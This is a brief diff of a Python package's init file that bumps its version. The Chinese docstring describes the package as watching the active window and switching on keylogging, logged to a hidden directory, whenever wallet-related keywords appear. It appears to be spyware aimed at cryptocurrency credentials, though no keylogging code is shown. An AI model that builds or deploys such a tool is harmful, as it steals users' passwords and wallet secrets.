@@ -4,7 +4,7 @@
 持续检测活动窗口，匹配钱包关键词时触发键盘记录，记录到 ~/.dev/bkler/recording_{日期}.log
 """
 
-__version__ = "0.2.0"
+__version__ = "0.2.1"
 __author__ = "YLX-STUDIO"
 
 from .logger import KeyLogger, create_log_file
